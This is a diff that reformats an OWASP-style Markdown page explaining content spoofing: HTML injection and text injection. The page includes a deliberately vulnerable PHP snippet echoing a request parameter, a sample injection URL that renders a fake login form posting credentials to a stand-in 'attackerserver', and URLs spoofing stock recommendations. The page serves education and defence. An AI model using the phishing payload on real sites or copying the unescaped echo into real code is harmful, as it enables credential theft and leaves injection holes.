@@ -42,7 +42,7 @@ is properly done by the victim business. For public traded companies,
 its shares will be falling down, leading to uncontrolled loss of
 millions.
 
-![](../../assets/images/Fake-text.png "Fake-text.png")
+![](../assets/images/Fake-text.png "Fake-text.png")
 
 ## Attack Scenario
 
@@ -61,11 +61,9 @@ Text injection can be easily found if:
 
 ## Applicable Industries
 
-- A business entity selling one type of product as a major business
-  function
+- A business entity selling one type of product as a major business function
 
-For example, Taxi hailing business, Online shopping business, Online
-service business
+For example, Taxi hailing business, Online shopping business, Online service business
 
 - A business entity relying on the brand name
 
@@ -80,14 +78,8 @@ For example, Cosmetic brand, Airline brand
 
 ## Content Spoofing vs. Cross-site Scripting
 
-Content spoofing is an attack that is closely related to [Cross-site
-Scripting (XSS)](<Cross-site_Scripting_(XSS)> "wikilink"). While XSS
-uses \[<https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>
-
-<script>
-
-and other techniques\] to run JavaScript, content spoofing uses other
-techniques to modify the page for malicious reasons.
+Content spoofing is an attack that is closely related to [Cross-site Scripting (XSS)](/xss). While XSS
+uses `<script>` and other techniques to run JavaScript, content spoofing uses other techniques to modify the page for malicious reasons.
 
 Even if XSS mitigation techniques are used within the web application,
 such as proper output encoding, the application can still be vulnerable
@@ -100,51 +92,42 @@ to text based content spoofing attacks.
 A possible attack scenario is demonstrated below. For this scenario,
 lets assumes no output encoding is being implemented:
 
-1.  Attacker discovers injection vulnerability and decides to spoof a
-    login form
-2.  Attacker crafts malicious link, including his injected HTML content,
-    and sends it to a user via email
-3.  The user visits the page due to the page being located within a
-    trusted domain
-4.  The attacker's injected HTML is rendered and presented to the user
-    asking for a username and password
-5.  The user enters a username and password, which are both sent to the
-    attackers server
+1. Attacker discovers injection vulnerability and decides to spoof a login form
+2. Attacker crafts malicious link, including his injected HTML content, and sends it to a user via email
+3. The user visits the page due to the page being located within a trusted domain
+4. The attacker's injected HTML is rendered and presented to the user asking for a username and password
+5. The user enters a username and password, which are both sent to the attackers server
 
-<!-- end list -->
+- A simple PHP page containing an injection vulnerability via the `name` parameter:
 
-  -
-    A simple PHP page containing an injection vulnerability via the
-    *name* parameter:
-
-<!-- end list -->
-
-    <?php
-        $name = $_REQUEST ['name'];
-    ?>
-    <html>
-        <h1>Welcome to the Internet!</h1>
-        <br>
-        <body>
-                Hello, <?php echo $name; ?>!
-            <p>We are so glad you are here!</p>
-        </body>
-    </html>
+```php
+<?php
+    $name = $_REQUEST ['name'];
+?>
+<html>
+    <h1>Welcome to the Internet!</h1>
+    <br>
+    <body>
+            Hello, <?php echo $name; ?>!
+        <p>We are so glad you are here!</p>
+    </body>
+</html>
+```
 
 The page functionality can be tested by making the following GET request
-to the page:
-
-    http://127.0.0.1/vulnerable.php?name=test
+to the page: `http://127.0.0.1/vulnerable.php?name=test`
 
 By requesting the link below, the page renders the injected HTML,
 presents a login form, and comments out the rest of the page after the
 injection point. Once a user enters their username and password, the
-values are sent to a page named *login.php* on the attacker's server via
+values are sent to a page named `login.php` on the attacker's server via
 POST.
 
-    http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST"
-    action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password"
-    name="password" /><br /><input type="submit" value="Login" /></form><!--
+```
+http://127.0.0.1/vulnerable.php?name=<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST"
+action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password"
+name="password" /><br /><input type="submit" value="Login" /></form><!--
+```
 
 ### Text Injection
 
@@ -153,62 +136,38 @@ information to a user via text manipulation. An attack scenario is
 demonstrated below. For this scenario, lets assume proper output
 encoding HAS been implemented and XSS is not possible:
 
-1.  An attacker identifies a web application that gives recommendations
-    to its users on whether they should buy or sell a particular stock
-2.  The attacker identifies a vulnerable parameter
-3.  The attacker crafts a malicious link by slightly modifying a valid
-    request
-4.  The link containing the modified request is sent to a user and they
-    clicks the link
-5.  A valid webpage is created using the attackers malicious
-    recommendation and the user believes the recommendation was from the
-    stock website
+1. An attacker identifies a web application that gives recommendations to its users on whether they should buy or sell a particular stock
+2. The attacker identifies a vulnerable parameter
+3. The attacker crafts a malicious link by slightly modifying a valid request
+4. The link containing the modified request is sent to a user and they clicks the link
+5. A valid webpage is created using the attackers malicious recommendation and the user believes the recommendation was from the stock website
 
 **Valid Page**
 
-    http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Recommend+You+Buy+Now
+`http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Recommend+You+Buy+Now`
 
 **Modified Page**
 
-    http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Really+Recommend+You+Sell+This+Stock+Now
+`http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=We+Really+Recommend+You+Sell+This+Stock+Now`
 
 Other example:
 
 **Modified Page**
 
-    http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=Our+site+has+experienced+major+hacking+incident.Please+use+our+competitor+site+http://www.competitor.com+until+we+further+announced+for+update.
-
-## Related [Attacks](https://owasp.org/www-community/attacks/)
-
-  - [Cross-site Scripting
-    (XSS)](Cross-site_Scripting_\(XSS\) "wikilink")
-  - [:Category:Injection Attack](:Category:Injection_Attack "wikilink")
-
-## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)
-
-  - [:Category:Input Validation
-    Vulnerability](:Category:Input_Validation_Vulnerability "wikilink")
-  - [Improper Data Validation](Improper_Data_Validation "wikilink")
+`http://vulnerablesite/suggestions.php?stockid=123&stockrecommendation=Our+site+has+experienced+major+hacking+incident.Please+use+our+competitor+site+http://www.competitor.com+until+we+further+announced+for+update.`
 
 ## Related [Controls](https://owasp.org/www-community/controls/)
 
-  - [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 
 ## References
 
-  - <http://capec.mitre.org/data/definitions/148.html>
-  - <http://projects.webappsec.org/w/page/13246917/Content%20Spoofing>
-  - <http://itlaw.wikia.com/wiki/Content_injection_attack>
-  - CERT Advisory on Malicious HTML Tags:
-    <http://www.cert.org/advisories/CA-2000-02.html>
-  - OWASP's [XSS (Cross Site Scripting) Prevention Cheat
-    Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-  - OWASP Guide to Building Secure Web Applications and Web Services,
-    Chapter 8: [Data Validation](Data_Validation "wikilink")
-  - HTML Code Injection and Cross-site Scripting:
-    <http://www.technicalinfo.net/papers/CSS.html>
-  - Case studies (Spotify, LinkedIn, ..etc):
-    <https://twitter.com/ncweaver/status/974802236567007232?s=12>
+- [CAPEC - 148](http://capec.mitre.org/data/definitions/148.html)
+- [WASC - Content Spoofing](http://projects.webappsec.org/w/page/13246917/Content%20Spoofing)
+- [Content Injection Attack](http://itlaw.wikia.com/wiki/Content_injection_attack)
+- [CERT Advisory on Malicious HTML Tags](http://www.cert.org/advisories/CA-2000-02.html)
+- OWASP's [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [HTML Code Injection and Cross-site Scripting](http://www.technicalinfo.net/papers/CSS.html)
+- [Case studies (Spotify, LinkedIn, ..etc)](https://twitter.com/ncweaver/status/974802236567007232?s=12)
 
 [Category:Injection](https://owasp.org/www-community/Injection_Flaws)
-[Category:Attack](Category:Attack "wikilink")
